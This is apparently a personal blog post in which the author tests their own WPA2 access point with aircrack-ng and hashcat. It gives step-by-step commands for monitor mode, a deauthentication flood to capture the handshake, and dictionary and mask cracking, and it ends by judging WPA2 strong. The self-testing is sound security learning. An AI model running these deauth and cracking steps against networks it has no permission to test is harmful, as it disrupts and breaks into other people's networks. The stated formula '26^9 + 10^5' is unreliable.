---
title: "Trying (and failing) To Hack My Access Point With Aircrack"
slug: hacking-my-access-point-with-aircrack
date: 2017-08-17 00:00:00
---

I had used aircrack in the days of WEP to crack trivial passwords. It was interesting to see just how vulnerable my own network was.

I wanted to get a handle on how those same tools work against WPA2.

I am happy to find that my neighbors and I are all using WPA2 with PSK.

I am happy because, in my very basic research, WPA2 seems incredibly difficult to crack. The tools are available, and I know that [some vulnerabilities](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup#Vulnerabilities) limit the effectiveness of WPA2, but the time and processing involved for any reasonably complex password on a patched access point seems outrageous.

That said, let's see if we can penetrate our own networks!

<!-- more -->

First, ensure you have the appropriate WiFi NIC to carry out the penetration test. The [
Penguin Wireless N USB Adapter for GNU / Linux (TPE-N150USB)](https://www.thinkpenguin.com/gnu-linux/penguin-wireless-n-usb-adapter-gnu-linux-tpe-n150usb) worked well for me.

![TPE-N150USB](https://www.thinkpenguin.com/files/wireless-n-usb-adapter-zero-1.jpg)

ThinkPenguin USB WiFi cards typically use Atheros chipsets, and because ThinkPenguin uses predictable chipsets you can be certain [you _will_ receive an Atheros chipset for this device](https://www.thinkpenguin.com/about). With this card, you can use monitor mode. The range not be great, but if you are testing the security of your own home network, range should not matter much.

Download and install [kali linux](https://www.kali.org/) to a USB drive and boot to that.

<span class="warning">These commands should all be run from within kali.</span>

## Collecting Packets

Enable monitor mode for your WiFi NIC. Replace `wlan0` where necessary with the address of your NIC.

```
airmon-ng start wlan0
```

Note the `Interface` result from the above command. That is the address of your monitor device. In my case, it is `wlan0mon`.

Scan for nearby networks.

```
airodump-ng wlan0mon
```

Note the results. In my case, I am testing against my own AP (the first line below). ESSIDs and BSSIDs have been altered for this article.

```
CH 11 ][ Elapsed: 18 s ][ 2017-08-18 01:18

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

C9:36:C1:B3:44:8A  -46       12        1    0   9  63e  WPA2 CCMP   PSK  WillRouter
66:34:E1:FF:3D:C6  -49       13        0    0   1  54e. OPN              ispwifi
40:64:91:81:89:D1  -49       12        0    0   3  54e. WPA2 CCMP   PSK  George
93:32:C8:59:B0:FF  -49       12        0    0   1  54e  WPA2 CCMP   PSK  FACTORY01
```

Note the BSSID and channel (CH) of the AP you plan to test.

Start monitoring traffic for that AP. BSSID `C9:36:C1:B3:44:8A` on channel `9`.

```
airodump-ng \
	--bssid C9:36:C1:B3:44:8A \
	-c 9 \
	--write WPAcrack \
	wlan0mon
```

`WPAcrack` is the naming scheme that will be used for a series of output files. You can use any other name in place of `WPAcrack` there if you want.

_Note that if you re-run the command without changing that name, `airodump-ng` automatically numbers the files for each run in sequence. So you'll end up with `WPAcrack-01`, `WPAcrack-02`, etc. A different number and a different set of files for each run._

Open a new terminal (do not kill/close the first one) and run this command.

```
aireplay-ng \
	--deauth 100 \
	-a C9:36:C1:B3:44:8A \
	wlan0mon
```

That command sends a message to deauthenticate wireless clients associated with the AP. The wireless client will then hopefully reauthenticate with the AP. The reauthentication is what generates the 4-way authentication handshake we are interested in collecting. [This is what we use to break the WPA/WPA2 pre-shared key.](http://aircrack-ng.org/doku.php?id=cracking_wpa#step_3_-_use_aireplay-ng_to_deauthenticate_the_wireless_client)

Look at your first terminal. The one running `airodump-ng`.

Once you see `[ WPA handshake: ...` on the first line, you're set. That means we successfully collected a handshake from a client on the AP's network. The list of three lines in the second section (`D5:77:31:FA:E0:76`, `A2:71:E2:27:D5:36`, `C3:45:81:89:9A:DD`) are all devices on my network.

```
CH  9 ][ Elapsed: 1 min ][ 2017-08-18 01:21 ][ WPA handshake: C9:36:C1:B3:44:8A

BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

C9:36:C1:B3:44:8A    0 100      857      210    4   9  63e  WPA2 CCMP   PSK  TinaBelcher

BSSID              STATION            PWR   Rate    Lost    Frames  Probe

C9:36:C1:B3:44:8A  D5:77:31:FA:E0:76  -42    0e- 1e     0       74
C9:36:C1:B3:44:8A  A2:71:E2:27:D5:36  -46    0e- 1e     0       45
C9:36:C1:B3:44:8A  C3:45:81:89:9A:DD  -52    0e- 1e    61       66
```

At this point you can kill the commands running in both terminal windows. You should have a set of files named using the naming scheme specified above.

```
WPAcrack-01.cap
WPAcrack-01.csv
WPAcrack-01.kismet.csv
WPAcrack-01.kismet.netxml
```

## Cracking Hashes

So, this is the part that, as far as I can tell, is almost impossible unless the password for the AP is **very** weak or you have incredible hardware, an excellent password dictionary, and a lot of patience.

We **do** have a handshake containing a password hash we can attempt to crack, but cracking it is a matter of time. I mean that in the most negative sense possible.

There are probably several ways to try and crack the password, but I'll discuss the two that seem most common.

* `aircrack-ng`
* `hashcat`

We can start with `aircrack-ng`.

The basic syntax for trying to crack a password with `aircrack-ng` is like so.

```
aircrack-ng \
	WPAcrack-01.cap \
	-w passwords.txt
```

Where `passwords.txt` is a list of passwords in plain text. I will use the terms `wordlist`, `password database`, and `dictionary` synonymously.

For fun, you should try to crack your own WiFi router's password. Create a `passwords.txt` file with a few lines of text.

Pretend this is a **massive** database that just happens to contain **your** AP's password.

```
not the password 1
not the password 2
<THE ACTUAL PASSWORD>
not the password 3
```

You *should* see `aircrack-ng` properly figure out the correct password. Now, consider how complex your password is, and how massive a database of potential passwords would need to be for your password to have been in it.

Let's look at using `hashcat` next.

Upload the `.cap` file to [hashcat's online cap -> hccapx conversion tool](https://hashcat.net/cap2hccapx/).

Download the generated `.hccapx` file.

We can now run `hashcat` similarly to how we ran `aircrack-ng` using our same contrived password wordlist.

```
hashcat \
	-m 2500 \
	--potfile-disable \
	WPAcrack.hccapx \
	passwords.txt
```

Where `2500` is the hash mode (WPA/WPA2), and we disable the use of a potfile, which is a sort of cache of potential matches.

I disable the potfile because once a hash matches, the result is cached for `hashcat`. Normally, that is desirable. However, for the sake of experimentation and using our contrived password list, I would rather see `hashcat` test the hashes every time and not look to that cache.

That's all well and fine if you have a weak password and a strong password database. You should see it eventually match the hash of the password in the database against the results from our captured network data.

What about brute force?

```
hashcat \
	-m 2500 \
	-a3 \
	WPAcrack.hccapx \
	?l?l?l?l?l?l?l?l?d?d?d?d?d
```

`a3` specifies the attack mode as brute force.

We can use a mask to indicate to `hashcat` that we know something about the password. In this case, it's 8 lower-case alpha characters followed by 5 digits. `?l?l?l?l?l?l?l?l?d?d?d?d?d`.

Even with that foreknowledge (which is incredibly detailed) about the password, `hashcat` (using my reasonably powerful NVIDIA card) estimates it will take quite a long time.

```
Time.Started.....: Thu Aug 17 21:14:12 2017 (1 min, 0 secs)
Time.Estimated...: Sun Oct 18 07:01:52 2020 (7281 years, 213 days)
```

It seems like [there is potentially a bug with hashcat estimation](https://hashcat.net/forum/thread-1939.html), but regardless of which figure is accurate, it is lengthy.

The combinations and potential values it has to guess are staggering when you think about it. Even for that relatively limited keyspace, it is working towards `20882706457600000` candidates (26^9 + 10^5). [[calculating total combinations for masks]](https://hashcat.net/wiki/doku.php?id=combination_count_formula)

```
Session..........: hashcat
Status...........: Running
Hash.Type........: WPA/WPA2
Hash.Target......: WPAcrack.hccapx
Time.Started.....: Thu Aug 17 21:14:12 2017 (1 min, 0 secs)
Time.Estimated...: Sun Oct 18 07:01:52 2020 (7281 years, 213 days)
Guess.Mask.......: ?l?l?l?l?l?l?l?l?d?d?d?d?d [13]
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:    90879 H/s (8.63ms)
Recovered........: 0/9 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 5406720/20882706457600000 (0.00%)
Rejected.........: 0/5406720 (0.00%)
Restore.Point....: 180224/803181017600000 (0.00%)
Candidates.#1....: jkjmlerd12345 -> jpqegerd12345
HWMon.Dev.#1.....: Temp: 72c Fan: 27% Util: 98% Core:1366MHz Mem:3004MHz Bus:16
```

I also attempted to crack my password using `15GB` wordlist, and an online cracking service. Both failed.

Yes, I am only a novice, and I'm sure there are plenty of hardware optimizations that could decrease that time, but I take this as a fairly promising example of WPA2 implementations.

However, I should not be too comfortable. This feels like a man who's never picked locks. Then that man tries to pick his own home lock, can't do it, and says "It must be a very strong lock!" That seems a bit silly. An experienced lock picker would probably have no issues where I could try for days and fail.

Still, I feel pretty good about modern crypto for the time being when I see that a reasonably strong password can make it not so trivial to crack a WPA2 password.

Well, as long as implementation weakness like [WPS](https://www.us-cert.gov/ncas/alerts/TA12-006A) and [NetUSB](https://www.exploit-db.com/exploits/38454/) are patched and disabled that is.

# Citations

* [Tutorial: How to Crack WPA/WPA2](http://aircrack-ng.org/doku.php?id=cracking_wpa)
* [Breaking a WPS PIN to Get the Password with Bully](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-breaking-wps-pin-get-password-with-bully-0158819/)
* [Cracking WPA2-PSK Passwords Using Aircrack-Ng](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/)
* [Mask Attack](https://hashcat.net/wiki/doku.php?id=mask_attack)
* [Calculating total combinations for masks](https://hashcat.net/wiki/doku.php?id=combination_count_formula)
